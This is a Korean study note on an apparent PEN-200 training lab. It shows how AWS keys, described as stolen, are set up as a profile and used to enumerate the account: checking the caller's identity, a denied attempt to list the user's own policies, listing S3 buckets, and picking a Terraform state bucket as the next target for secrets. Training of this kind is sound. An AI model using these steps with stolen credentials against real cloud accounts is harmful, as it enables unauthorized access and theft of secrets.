# 26.10.5 획득한 자격 증명으로 열거

> **Enumerating with Discovered Credentials** · PEN-200 §26.10.5

확보한 키로 환경을 더 열거함. `aws configure` 에 `--profile` 을 붙여 `stolen-s3` 프로필로 저장함.

```
kali@kali:~$ aws configure --profile=stolen-s3
AWS Access Key ID [None]: [REDACTED-AWS-KEY-ID]
AWS Secret Access Key [None]: [REDACTED-AWS-SECRET]
Default region name [None]: us-east-1
Default output format [None]:
```

먼저 키가 유효한지, 어느 계정·사용자에 묶인 것인지를 `sts get-caller-identity` 로 확인함.

```
kali@kali:~$ aws --profile=stolen-s3 sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGIFYDAVQPLB",
    "Account": "347537569308",
    "Arn": "arn:aws:iam::277537169808:user/s3_explorer"
}
```

내용 자체는 대단치 않지만 **키가 살아 있다는 확인**과 사용자명이 `s3_explorer` — 즉 S3 Explorer 전용으로 만들어진 계정이라는 단서를 줌. 제대로 설정돼 있다면 권한이 좁을 것임.

`iam list-user-policies` 로 자기 정책을 보려 함.

```
kali@kali:~$ aws --profile=stolen-s3 iam list-user-policies --user-name s3_explorer
An error occurred (AccessDenied) when calling the ListUserPolicies operation: User:
arn:aws:iam::277537169808:user/s3_explorer is not authorized to perform:
iam:ListUserPolicies on resource: user s3_explorer because no identity-based policy
allows the iam:ListUserPolicies action
```

*`AccessDenied` — 자기 정책을 나열할 권한조차 없음*

여기서 모든 액션을 무차별로 시도할 수도 있으나, **이 키가 «무엇을 하라고» 만들어졌는지에서 출발하는 편이 빠름**. 용도가 `company-directory-9b58rezp3vvkf90f` 버킷 나열이므로 그것부터 시도함.

```
kali@kali:~$ aws --profile=stolen-s3 s3 ls company-directory-9b58rezp3vvkf90f
2023-07-06 13:49:19        117 Alen.I.vcf
2023-07-06 13:49:19        118 Goran.B.vcf
2023-07-06 13:49:19        117 Zeljko.B.vcf
```

*의도된 용도라 그대로 통함 — `.vcf` 파일 셋이 나옴*

한 걸음 더 나아가 계정 전체의 버킷을 나열해 봄 — `s3api` 의 `list-buckets` 를 씀.

```
kali@kali:~$ aws --profile=stolen-s3 s3api list-buckets
{
    "Buckets": [
        {
            "Name": "company-directory-9b58rezp3vvkf90f",
            "CreationDate": "2023-07-06T16:21:16+00:00"
        },
        {
            "Name": "tf-state-9b58rezp3vvkf90f",
            "CreationDate": "2023-07-06T16:21:16+00:00"
        }
    ]
    ...
}
```

company-directory 외에 `tf-state-` 로 시작하는 버킷이 하나 더 나옴. 클라우드 환경에서 「tf」는 대개 Terraform 이고, Terraform **상태 파일은 현재 구성을 담으며 시크릿까지 들어갈 수 있음**. 다음 표적은 이것임.
